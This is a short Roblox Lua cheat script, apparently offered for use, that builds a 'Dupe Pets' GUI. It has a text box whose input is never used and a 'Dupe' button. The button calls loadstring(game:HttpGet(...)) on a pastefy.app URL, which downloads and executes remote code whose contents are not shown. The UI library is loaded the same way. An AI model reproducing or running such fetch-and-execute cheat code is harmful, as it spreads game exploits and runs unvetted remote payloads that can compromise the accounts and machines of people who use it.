local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")

-- Вкладка Dupe Pet
local DupeTab = Window:NewTab("Dupe Pet")
local DupeSection = DupeTab:NewSection("DUPE PET")  -- Зеленый заголовок

-- Текстовое поле для ввода
local InputField = DupeSection:NewTextBox("", "Type here!", function(text)
    -- Можно использовать введенный текст
end)
InputField.Instance.Size = UDim2.new(0, 250, 0, 30)

-- Кнопка Dupe
local DupeButton = DupeSection:NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)
DupeButton.Instance.Size = UDim2.new(0, 100, 0, 30)

-- Вкладка Credits
local CreditsTab = Window:NewTab("Credits")
CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
